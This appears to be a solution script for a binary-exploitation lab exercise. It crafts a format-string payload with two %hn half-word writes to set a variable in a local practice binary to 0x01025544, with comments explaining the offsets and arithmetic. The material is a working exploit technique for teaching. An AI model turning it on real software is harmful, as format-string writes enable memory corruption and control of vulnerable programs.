#!/usr/bin/env bash
# ex08 — Format-string %hn split write: set target (0x080496f4) == 0x01025544
# printf(buf) called through a wrapper (printbuffer), so buf lands at slot 12.
# Value 0x01025544 is split into two 16-bit halves and written with %hn:
#   high half 0x0102 (258)  -> 0x080496f6  (slot 12)
#   low  half 0x5544 (21828) -> 0x080496f4  (slot 13)
# Order: smaller count first (high half), then delta to reach low half.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex08 — format-string double %hn write to target"
echo "[*] target : 0x080496f4  goal : 0x01025544"
echo ""

python3 -c "
import sys, struct
p  = struct.pack('<I', 0x080496f6)          # slot 12 -> high half
p += struct.pack('<I', 0x080496f4)          # slot 13 -> low  half
p += b'%250x%12\$hn%21570x%13\$hn\n'
sys.stdout.buffer.write(p)
" | "$BIN" | tail -1

echo ""
echo "[*] done."
